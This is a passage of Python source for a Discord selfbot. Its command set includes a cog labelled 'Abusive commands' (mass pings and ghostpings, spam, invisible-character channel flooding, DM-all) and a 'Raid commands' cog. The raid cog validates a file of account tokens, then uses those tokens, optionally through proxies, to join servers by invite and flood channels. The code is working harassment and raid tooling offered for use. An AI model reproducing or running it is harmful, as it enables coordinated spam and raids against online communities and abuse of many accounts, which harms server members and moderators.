				embed.set_footer(text=footervar(), icon_url=footer_iconurlvar())
				embed.set_author(name=authorvar(), url=authorurlvar(), icon_url=author_iconurlvar())
				embed.set_image(url=largeimagevar())
				send(luna, embed)
			except Exception as e:
				if errorlog() == "console":
					printerror(f"{e}")
				else:
					embed = discord.Embed(title="Error", url=titleurlvar(), description=f"```\n{e}```", color=hexcolorvar())
					embed.set_thumbnail(url=imagevar())
					embed.set_footer(text=footervar(), icon_url=footer_iconurlvar())
					embed.set_author(name=authorvar(), url=authorurlvar(), icon_url=author_iconurlvar())
					embed.set_image(url=largeimagevar())
					await send(luna, embed)

	@commands.command(name = 'stopactivity', 
				usage="", 
				aliases=["stopstreaming", "stopstatus", "stoplistening", "stopplaying", "stopwatching"],
				description = "Stop your activity.")
	async def stopactivity(self, luna):
		await luna.message.delete()
		await self.bot.change_presence(activity=None, status=discord.Status.dnd)
		embed = discord.Embed(title=titlevar(), url=titleurlvar(), description="```\nStopped activity```", color=hexcolorvar())
		embed.set_thumbnail(url=imagevar())
		embed.set_footer(text=footervar(), icon_url=footer_iconurlvar())
		embed.set_author(name=authorvar(), url=authorurlvar(), icon_url=author_iconurlvar())
		embed.set_image(url=largeimagevar())
		await send(luna, embed)

	@commands.command(name = "clean",
					usage="<amount>",
					description = "Clean your messages")
	async def clean(self, luna, amount: int = None):
		await luna.message.delete()
		try:
			if amount is None:
				embed = discord.Embed(title="Error", url=titleurlvar(), description="```\nInvalid amount```", color=hexcolorvar())
				embed.set_thumbnail(url=imagevar())
				embed.set_footer(text=footervar(), icon_url=footer_iconurlvar())
				embed.set_author(name=authorvar(), url=authorurlvar(), icon_url=author_iconurlvar())
				embed.set_image(url=largeimagevar())
				await send(luna, embed)
			else:
				await luna.channel.purge(limit=amount, before=luna.message, check=is_me)
		except:
			try:
				await asyncio.sleep(1)
				async for message in luna.message.channel.history(limit=amount):
					if message.author == self.bot.user:
						await message.delete()
					else:
						pass
			except Exception as e:
				if errorlog() == "console":
					printerror(f"{e}")
				else:
					embed = discord.Embed(title="Error", url=titleurlvar(), description=f"```\n{e}```", color=hexcolorvar())
					embed.set_thumbnail(url=imagevar())
					embed.set_footer(text=footervar(), icon_url=footer_iconurlvar())
					embed.set_author(name=authorvar(), url=authorurlvar(), icon_url=author_iconurlvar())
					embed.set_image(url=largeimagevar())
					await send(luna, embed)
				return

	@commands.command(name = "textreact",
					aliases=['treact'],
					usage="<amount>",
					description = "Text as reaction")
	async def textreact(self, luna, messageNo: typing.Optional[int] = 1, *, text):
		await luna.message.delete()
		text = (c for c in text.lower())
		emotes = {
			"a": "🇦",
			"b": "🇧",
			"c": "🇨",
			"d": "🇩",
			"e": "🇪",
			"f": "🇫",
			"g": "🇬",
			"h": "🇭",
			"i": "🇮",
			"j": "🇯",
			"k": "🇰",
			"l": "🇱",
			"m": "🇲",
			"n": "🇳",
			"o": "🇴",
			"p": "🇵",
			"q": "🇶",
			"r": "🇷",
			"s": "🇸",
			"t": "🇹",
			"u": "🇺",
			"v": "🇻",
			"w": "🇼",
			"x": "🇽",
			"y": "🇾",
			"z": "🇿",
		}
		for i, m in enumerate(await luna.channel.history(limit=100).flatten()):
			if messageNo == i:
				for c in text:
					await m.add_reaction(f"{emotes[c]}")
				break
        
	@commands.command(name = "afk",
					usage="<on/off>",
					description = "AFK mode on/off")
	async def afk(self, luna, mode:str=None):
		await luna.message.delete()

		global afkstatus

		if mode == "on" or mode == "off":
			printmessage(f"AFK Mode » {purple(f'{mode}')}")
			if mode == "on":
				afkstatus = 1
			else:
				afkstatus = 0
			await embed_builder(luna, description=f"```\nError logging » {mode}```")
		else:
			await mode_error(luna, "on or off")

	@commands.command(name = "calc",
					usage="",
					description = "Opens calculator")
	async def calc(self, luna):
		await luna.message.delete()
		printcommand("calc")
		from subprocess import call
		call(["calc.exe"])

	@commands.command(name = "passgen",
					usage="",
					description = "Generate a password")
	async def passgen(self, luna):
		await luna.message.delete()

		code = ''.join(random.choices(string.ascii_letters + string.digits, k=16))
		embed = discord.Embed(title=titlevar(), url=titleurlvar(), description=f"```\nPassword generated ↴\n\n{code}```", color=hexcolorvar())
		embed.set_thumbnail(url=imagevar())
		embed.set_footer(text=footervar(), icon_url=footer_iconurlvar())
		embed.set_author(name=authorvar(), url=authorurlvar(), icon_url=author_iconurlvar())
		embed.set_image(url=largeimagevar())
		await send(luna, embed)

	@commands.command(name = "invisiblenick",
					usage="",
					description = "Make your nickname invisible")
	async def invisiblenick(self, luna):
		await luna.message.delete()

		try:
			name = "‎‎‎‎‎‎‎‏‏‎ ឵឵ ឵឵ ឵឵ ឵឵‎"
			await luna.message.author.edit(nick=name)
		except Exception as e:
			await luna.send(f"Error: {e}")

	@commands.command(name = "hypesquad",
					usage="<bravery/brilliance/balance>",
					description = "Change Hypesquad house")
	async def hypesquad(self, luna, house:str):
		await luna.message.delete()
		with open('./config.json') as f:
			config = json.load(f)
		token = config.get('token')
		request = requests.session()
		headers = {
			'Authorization': token,
			'Content-Type': 'application/json'
		}

		if house == "bravery":
			payload = {'house_id': 1}
		elif house == "brilliance":
			payload = {'house_id': 2}
		elif house == "balance":
			payload = {'house_id': 3}

		try:
			request.post('https://discordapp.com/api/v6/hypesquad/online', headers=headers, json=payload)
			printmessage(f"Successfully set your hypesquad house to {house}")
			embed = discord.Embed(title="Hypesquad", url=titleurlvar(), description=f"```\nSuccessfully set your hypesquad house to {house}```", color=hexcolorvar())
			embed.set_thumbnail(url=imagevar())
			embed.set_footer(text=footervar(), icon_url=footer_iconurlvar())
			embed.set_author(name=authorvar(), url=authorurlvar(), icon_url=author_iconurlvar())
			embed.set_image(url=largeimagevar())
			await send(luna, embed)
		except:
			if errorlog() == "console":
				printerror("Failed to set your hypesquad house")
			else:
				embed = discord.Embed(title="Error", url=titleurlvar(), description=f"```\nFailed to set your hypesquad house```", color=0xff0000)
				embed.set_thumbnail(url=imagevar())
				embed.set_footer(text=footervar(), icon_url=footer_iconurlvar())
				embed.set_author(name=authorvar(), url=authorurlvar(), icon_url=author_iconurlvar())
				embed.set_image(url=largeimagevar())
				await send(luna, embed)

	@commands.command(name = "acceptfriends",
					usage="",
					description = "Accept friend requests")
	async def acceptfriends(self, luna):
		await luna.message.delete()
		for relationship in self.bot.user.relationships:
			if relationship == discord.RelationshipType.incoming_request:
				try:
					await relationship.accept()
					printmessage(f"Accepted {relationship}")
				except Exception:
					pass


	@commands.command(name = "ignorefriends",
					usage="",
					description = "Delete friend requests")
	async def ignorefriends(self, luna):
		await luna.message.delete()
		for relationship in self.bot.user.relationships:
			if relationship is discord.RelationshipType.incoming_request:
				relationship.delete()
				printmessage(f"Deleted {relationship}")


	@commands.command(name = "delfriends",
					usage="",
					description = "Delete all friends")
	async def delfriends(self, luna):
		await luna.message.delete()
		for relationship in self.bot.user.relationships:
			if relationship is discord.RelationshipType.friend:
				try:
					await relationship.delete()
					printmessage(f"Deleted {relationship}")
				except Exception:
					pass


	@commands.command(name = "clearblocked",
					usage="",
					description = "Delete blocked friends")
	async def clearblocked(self, luna):
		await luna.message.delete()
		for relationship in self.bot.user.relationships:
			if relationship is discord.RelationshipType.blocked:
				try:
					await relationship.delete()
					printmessage(f"Deleted {relationship}")
				except Exception:
					pass

	@commands.command(name = "leaveservers",
					usage="",
					description = "Leave all servers")
	async def leaveservers(self, luna):
		await luna.message.delete()
		try:
			guilds = requests.get('https://canary.discordapp.com/api/v8/users/@me/guilds', headers={'authorization': token, 'user-agent': 'Mozilla/5.0'}).json()
			for guild in range(0, len(guilds)):
				guild_id = guilds[guild]['id']
				requests.delete(f'https://canary.discordapp.com/api/v8/users/@me/guilds/{guild_id}', headers={'authorization': token, 'user-agent': 'Mozilla/5.0'})
				printmessage(f"Left {guild}")
		except Exception:
			pass

bot.add_cog(UtilsCog(bot))

class AbuseCog(commands.Cog, name="Abusive commands"):
	def __init__(self, bot:commands.bot):
		self.bot = bot

	@commands.command(name = "massping",
					usage="<delay> <amount>",
					description = "Mass ping members")
	async def massping(self, luna, delay:int, amount:int):
		await luna.message.delete()
		if riskmode() == "on":
			try:
				for i in range(amount):
					members = [m.mention for m in luna.guild.members]
					if len(members) < 30:
						mentionamount = len(members)
					else:
						mentionamount = 30
					sendamount = len(members) - mentionamount + 1
					for i in range(sendamount):
						if mentionamount == 0:
							break
						pingtext = ""
						for i in range(mentionamount):
							pingtext += members.pop()
						await luna.send(pingtext)
						await asyncio.sleep(delay)
						if len(members) < 30:
							mentionamount = len(members)
						else:
							mentionamount = 30
						sendamount = len(members) - mentionamount + 1
			except Exception as e:
				printerror(f"{e}")
		else:
			if errorlog() == "console":
				printerror("```\nRiskmode is disabled```")
			else:
				embed = discord.Embed(title="Error", url=titleurlvar(), description=f"```\nRiskmode is disabled```", color=0xff0000)
				embed.set_thumbnail(url=imagevar())
				embed.set_footer(text=footervar(), icon_url=footer_iconurlvar())
				embed.set_author(name=authorvar(), url=authorurlvar(), icon_url=author_iconurlvar())
				embed.set_image(url=largeimagevar())
				await send(luna, embed)

	@commands.command(name = "massgp",
					usage="<delay> <amount>",
					description = "Mass ghostping members")
	async def massgp(self, luna, delay:int, amount:int):
		await luna.message.delete()
		if riskmode() == "on":
			try:
				for i in range(amount):
					members = [m.mention for m in luna.guild.members]
					if len(members) < 30:
						mentionamount = len(members)
					else:
						mentionamount = 30
					sendamount = len(members) - mentionamount + 1
					for i in range(sendamount):
						if mentionamount == 0:
							break
						pingtext = ""
						for i in range(mentionamount):
							pingtext += members.pop()
						msg = await luna.send(pingtext)
						await msg.delete()
						await asyncio.sleep(delay)
						if len(members) < 40:
							mentionamount = len(members)
						else:
							mentionamount = 40
						sendamount = len(members) - mentionamount + 1
			except Exception as e:
				printerror(f"{e}")
		else:
			if errorlog() == "console":
				printerror("```\nRiskmode is disabled```")
			else:
				embed = discord.Embed(title="Error", url=titleurlvar(), description=f"```\nRiskmode is disabled```", color=0xff0000)
				embed.set_thumbnail(url=imagevar())
				embed.set_footer(text=footervar(), icon_url=footer_iconurlvar())
				embed.set_author(name=authorvar(), url=authorurlvar(), icon_url=author_iconurlvar())
				embed.set_image(url=largeimagevar())
				await send(luna, embed)

	@commands.command(name = "spam",
					usage="<delay> <amount> <message>",
					description = "Spam a message")
	async def spam(self, luna, delay:int, amount:int, *, message:str):
		await luna.message.delete()
		if riskmode() == "on":
			try:
				for each in range(0, amount):
					await asyncio.sleep(delay)
					await luna.send(f"{message}")
			except Exception as e:
				if errorlog() == "console":
					printerror(f"{e}")
				else:
					embed = discord.Embed(title="Error", url=titleurlvar(), description=f"```\n{e}```", color=0xff0000)
					embed.set_thumbnail(url=imagevar())
					embed.set_footer(text=footervar(), icon_url=footer_iconurlvar())
					embed.set_author(name=authorvar(), url=authorurlvar(), icon_url=author_iconurlvar())
					embed.set_image(url=largeimagevar())
					await send(luna, embed)
		else:
			if errorlog() == "console":
				printerror("```\nRiskmode is disabled```")
			else:
				embed = discord.Embed(title="Error", url=titleurlvar(), description=f"```\nRiskmode is disabled```", color=0xff0000)
				embed.set_thumbnail(url=imagevar())
				embed.set_footer(text=footervar(), icon_url=footer_iconurlvar())
				embed.set_author(name=authorvar(), url=authorurlvar(), icon_url=author_iconurlvar())
				embed.set_image(url=largeimagevar())
				await send(luna, embed)

	@commands.command(name = "spamgp",
					usage="<delay> <amount> <@member>",
					aliases=['spg', 'spamghostping', 'sghostping'],
					description = "Ghostpings")
	async def spamgp(self, luna, delay: int = None, amount: int = None, user: discord.Member = None):
		await luna.message.delete()
		if riskmode() == "on":
			try:
				if delay is None or amount is None or user is None:
					await luna.send(f"Usage: {self.bot.prefix}spamghostping <delay> <amount> <@member>")
				else:
					for each in range(0, amount):
						await asyncio.sleep(delay)
						await luna.send(user.mention, delete_after=0)
			except Exception as e:
				await luna.send(f"Error: {e}")
		else:
			if errorlog() == "console":
				printerror("```\nRiskmode is disabled```")
			else:
				embed = discord.Embed(title="Error", url=titleurlvar(), description=f"```\nRiskmode is disabled```", color=0xff0000)
				embed.set_thumbnail(url=imagevar())
				embed.set_footer(text=footervar(), icon_url=footer_iconurlvar())
				embed.set_author(name=authorvar(), url=authorurlvar(), icon_url=author_iconurlvar())
				embed.set_image(url=largeimagevar())
				await send(luna, embed)

	@commands.command(name = "purgehack",
					usage="",
					description = "Purge a channel")
	async def purgehack(self, luna):
		await luna.message.delete()
		if riskmode() == "on":
			await luna.send("​​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n")
			await luna.send("​​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n")
			await luna.send("​​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n")
			await luna.send("​​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n")
			await luna.send("​​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n")
			await luna.send("​​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n")
			await luna.send("​​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n​\n")
		else:
			if errorlog() == "console":
				printerror("```\nRiskmode is disabled```")
			else:
				embed = discord.Embed(title="Error", url=titleurlvar(), description=f"```\nRiskmode is disabled```", color=0xff0000)
				embed.set_thumbnail(url=imagevar())
				embed.set_footer(text=footervar(), icon_url=footer_iconurlvar())
				embed.set_author(name=authorvar(), url=authorurlvar(), icon_url=author_iconurlvar())
				embed.set_image(url=largeimagevar())
				await send(luna, embed)

	@commands.command(name = "mpreact",
					usage="<emoji>",
					description = "Reacts the last 20 messages")
	async def mpreact(self, luna, emoji):
		await luna.message.delete()
		if riskmode() == "on":
			messages = await luna.message.channel.history(limit=20).flatten()
			for message in messages:
				await message.add_reaction(emoji)
		else:
			if errorlog() == "console":
				printerror("```\nRiskmode is disabled```")
			else:
				embed = discord.Embed(title="Error", url=titleurlvar(), description=f"```\nRiskmode is disabled```", color=0xff0000)
				embed.set_thumbnail(url=imagevar())
				embed.set_footer(text=footervar(), icon_url=footer_iconurlvar())
				embed.set_author(name=authorvar(), url=authorurlvar(), icon_url=author_iconurlvar())
				embed.set_image(url=largeimagevar())
				await send(luna, embed)

	@commands.command(name = "junknick",
					usage="",
					description = "Pure junk nickname")
	async def junknick(self, luna):
		await luna.message.delete()
		if riskmode() == "on":
			try:
				name = "𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫"
				await luna.author.edit(nick=name)
			except Exception as e:
				if errorlog() == "console":
					printerror(e)
				else:
					embed = discord.Embed(title="Error", url=titleurlvar(), description=e, color=0xff0000)
					embed.set_thumbnail(url=imagevar())
					embed.set_footer(text=footervar(), icon_url=footer_iconurlvar())
					embed.set_author(name=authorvar(), url=authorurlvar(), icon_url=author_iconurlvar())
					embed.set_image(url=largeimagevar())
					await send(luna, embed)
		else:
			if errorlog() == "console":
				printerror("```\nRiskmode is disabled```")
			else:
				embed = discord.Embed(title="Error", url=titleurlvar(), description=f"```\nRiskmode is disabled```", color=0xff0000)
				embed.set_thumbnail(url=imagevar())
				embed.set_footer(text=footervar(), icon_url=footer_iconurlvar())
				embed.set_author(name=authorvar(), url=authorurlvar(), icon_url=author_iconurlvar())
				embed.set_image(url=largeimagevar())
				await send(luna, embed)

	@commands.command(name = "dmall",
					usage="<message>",
					description = "DM every member")
	async def dmall(self, luna, *, message: str):
		await luna.message.delete()
		if riskmode() == "on":
			sent = 0
			try:
				members = luna.channel.members
				for member in members:
					if member is not luna.author:
						try:
							await member.send(message)
							printmessage(f"Sent {message} to {member}")
							sent += 1
						except Exception:
							pass
			except Exception:
				printerror(f"Failed to send {message} to {member}")
				pass
			embed = discord.Embed(title=titlevar(), url=titleurlvar(), description=f"```\nSent {message} to {sent} users```", color=hexcolorvar())
			embed.set_thumbnail(url=imagevar())
			embed.set_footer(text=footervar(), icon_url=footer_iconurlvar())
			embed.set_author(name=authorvar(), url=authorurlvar(), icon_url=author_iconurlvar())
			embed.set_image(url=largeimagevar())
			await send(luna, embed)
		else:
			if errorlog() == "console":
				printerror("```\nRiskmode is disabled```")
			else:
				embed = discord.Embed(title="Error", url=titleurlvar(), description=f"```\nRiskmode is disabled```", color=0xff0000)
				embed.set_thumbnail(url=imagevar())
				embed.set_footer(text=footervar(), icon_url=footer_iconurlvar())
				embed.set_author(name=authorvar(), url=authorurlvar(), icon_url=author_iconurlvar())
				embed.set_image(url=largeimagevar())
				await send(luna, embed)

	@commands.command(name = "dmallfriends",
					usage="<message>",
					description = "DM all friends")
	async def dmallfriends(self, luna, *, message: str):
		await luna.message.delete()
		if riskmode() == "on":
			sent = 0
			try:
				for user in self.user.friends:
					try:
						await user.send(message)
						printmessage(f"Sent {message} to {member}")
						sent += 1
					except Exception:
						printerror(f"Failed to send {message} to {member}")
						pass
			except Exception:
				pass
			embed = discord.Embed(title=titlevar(), url=titleurlvar(), description=f"```\nSent {message} to {sent} friends```", color=hexcolorvar())
			embed.set_thumbnail(url=imagevar())
			embed.set_footer(text=footervar(), icon_url=footer_iconurlvar())
			embed.set_author(name=authorvar(), url=authorurlvar(), icon_url=author_iconurlvar())
			embed.set_image(url=largeimagevar())
			await send(luna, embed)
		else:
			if errorlog() == "console":
				printerror("```\nRiskmode is disabled```")
			else:
				embed = discord.Embed(title="Error", url=titleurlvar(), description=f"```\nRiskmode is disabled```", color=0xff0000)
				embed.set_thumbnail(url=imagevar())
				embed.set_footer(text=footervar(), icon_url=footer_iconurlvar())
				embed.set_author(name=authorvar(), url=authorurlvar(), icon_url=author_iconurlvar())
				embed.set_image(url=largeimagevar())
				await send(luna, embed)

	@commands.command(name = "sendall",
					usage="<message>",
					description = "Message in all channels")
	async def sendall(self, luna, *, message):
		await luna.message.delete()
		if riskmode() == "on":
			try:
				channels = luna.guild.text_channels
				for channel in channels:
					await channel.send(message)
			except:
				pass
		else:
			if errorlog() == "console":
				printerror("```\nRiskmode is disabled```")
			else:
				embed = discord.Embed(title="Error", url=titleurlvar(), description=f"```\nRiskmode is disabled```", color=0xff0000)
				embed.set_thumbnail(url=imagevar())
				embed.set_footer(text=footervar(), icon_url=footer_iconurlvar())
				embed.set_author(name=authorvar(), url=authorurlvar(), icon_url=author_iconurlvar())
				embed.set_image(url=largeimagevar())
				await send(luna, embed)

bot.add_cog(AbuseCog(bot))

class RaidCog(commands.Cog, name="Raid commands"):
	def __init__(self, bot:commands.bot):
		self.bot = bot
        
	@commands.command(name = "tokencheck",
					usage="",
					description = "Check the tokens.txt")
	async def tokencheck(self, luna):
		await luna.message.delete()

		file = open("data/tokens.txt", "r")
		nonempty_lines = [line.strip("\n") for line in file if line != "\n"]
		line_count = len(nonempty_lines)
		file.close()

		if os.stat("data/tokens.txt").st_size == 0:
			embed = discord.Embed(title="Tokencheck", url=titleurlvar(), description=f"```\ntokens.txt is empty...```", color=hexcolorvar())
			embed.set_thumbnail(url=imagevar())
			embed.set_footer(text=footervar(), icon_url=footer_iconurlvar())
			embed.set_author(name=authorvar(), url=authorurlvar(), icon_url=author_iconurlvar())
			embed.set_image(url=largeimagevar())
			await send(luna, embed)
			return

		if mode() == 2:
			sent = await luna.send(f"```ini\n[ Tokencheck ]\n\nDetected {line_count} tokens.\nChecking tokens...\n\n[ {footervar()} ]```")
		else:
			embed = discord.Embed(title="Tokencheck", url=titleurlvar(), description=f"```\nDetected {line_count} tokens.\nChecking tokens...```", color=hexcolorvar())
			embed.set_thumbnail(url=imagevar())
			embed.set_footer(text=footervar(), icon_url=footer_iconurlvar())
			embed.set_author(name=authorvar(), url=authorurlvar(), icon_url=author_iconurlvar())
			embed.set_image(url=largeimagevar())
			sent = await luna.send(embed=embed)

		valid_tokens=[]
		success = 0
		failed = 0

		with open("data/tokens.txt","r+") as f:
			for line in f:
				token=line.strip("\n")
				headers = {'Content-Type': 'application/json', 'authorization': token}
				url = "https://discordapp.com/api/v6/users/@me/library"
				request = requests.get(url, headers=headers)
				if request.status_code == 200:
					valid_tokens.append(token)
					success += 1
				else:
					failed += 1
					pass

		with open("data/tokens.txt","w+") as f:
			for i in valid_tokens:
				f.write(i+"\n")

		if mode() == 2:
			await sent.edit(f"```ini\n[ Tokencheck ]\n\nSuccessfully checked all tokens and removed invalid ones.\nValid tokens » "+str(success)+"\nInvalid tokens » "+str(failed)+"\n\n[ {footervar()} ]```")
			await asyncio.sleep(deletetimer())
			await sent.delete() 
		else:
			embed = discord.Embed(title="Tokencheck", url=titleurlvar(), description=f"```\nSuccessfully checked all tokens and removed invalid ones.\n``````\nValid tokens » "+str(success)+"\nInvalid tokens » "+str(failed)+"```", color=hexcolorvar())
			embed.set_thumbnail(url=imagevar())
			embed.set_footer(text=footervar(), icon_url=footer_iconurlvar())
			embed.set_author(name=authorvar(), url=authorurlvar(), icon_url=author_iconurlvar())
			embed.set_image(url=largeimagevar())
			await sent.edit(embed=embed)
			await asyncio.sleep(deletetimer())
			await sent.delete() 

	@commands.command(name = "raidjoin",
					usage="<invitelink>",
					description = "Raid the server")
	async def raidjoin(self, luna, invitelink:str):
		await luna.message.delete()
		if riskmode() == "on":
			tokens = open('data/tokens.txt', 'r')
			for _token in tokens:
				_token = _token.split('\n')
				_token = _token[0]
				try:
					async with httpx.AsyncClient() as client:
						await client.post(f'https://canary.discord.com/api/v8/invites/{invitelink}', headers={'authorization': _token, 'user-agent': 'Mozilla/5.0'})
						printevent(f"{_token} joined {invitelink}")
				except Exception:
					printerror(f"{_token} failed to join {invitelink}")
					pass
		else:
			embed = discord.Embed(title="Error", url=titleurlvar(), description=f"```\nRiskmode is disabled```", color=0xff0000)
			embed.set_thumbnail(url=imagevar())
			embed.set_footer(text=footervar(), icon_url=footer_iconurlvar())
			embed.set_author(name=authorvar(), url=authorurlvar(), icon_url=author_iconurlvar())
			embed.set_image(url=largeimagevar())
			await send(luna, embed)

	@commands.command(name = "proxyjoin",
					usage="<invitelink>",
					description = "Raid the server")
	async def proxyjoin(self, luna, invitelink:str):
		await luna.message.delete()
		if riskmode() == "on":

			tokens = open('data/tokens.txt', 'r')
			proxies = open('data/proxies.txt', 'r')
			
			proxylist = []
			
			for p, _proxy in enumerate(proxies):
				proxy = _proxy.split('\n')[0]
				proxylist.append(proxy)
				
			for p, _token in enumerate(tokens):
				_token = _token.split('\n')
				_token = _token[0]
				try:
					async with httpx.AsyncClient() as client:
						await client.post(f'https://canary.discord.com/api/v8/invites/{invitelink}', headers={'authorization': _token, 'user-agent': 'Mozilla/5.0'}, proxies={'http://': f'http://{proxylist[p]}'})
						printevent(f"[PROXY] {_token} joined {invitelink}")
				except Exception:
					printerror(f"[PROXY] {_token} failed to join {invitelink}")
					pass
		else:
			embed = discord.Embed(title="Error", url=titleurlvar(), description=f"```\nRiskmode is disabled```", color=0xff0000)
			embed.set_thumbnail(url=imagevar())
			embed.set_footer(text=footervar(), icon_url=footer_iconurlvar())
			embed.set_author(name=authorvar(), url=authorurlvar(), icon_url=author_iconurlvar())
			embed.set_image(url=largeimagevar())
			await send(luna, embed)

	@commands.command(name = "raidspam",
					usage="<channel_id> <amount> <message>",
					description = "Spam")
	async def raidspam(self, luna, channel_id:str, amount:int, *, message:str):
		await luna.message.delete()
		if riskmode() == "on":

			tokens = open('data/tokens.txt', 'r')
			for _token in tokens:
				_token = _token.split('\n')
				_token = _token[0]
				try:
					async with httpx.AsyncClient() as client:
						for i in range(0, amount):
							await client.post(f'https://canary.discord.com/api/v8/channels/{channel_id}/messages', json={'content': f'{message}', 'tts': 'false'}, headers={'authorization': _token, 'user-agent': 'Mozilla/5.0'})
							printevent(f"{_token} sent {message}")
				except Exception:
					printerror(f"{_token} failed to send {message}")
					pass
		else:
			embed = discord.Embed(title="Error", url=titleurlvar(), description=f"```\nRiskmode is disabled```", color=0xff0000)
			embed.set_thumbnail(url=imagevar())
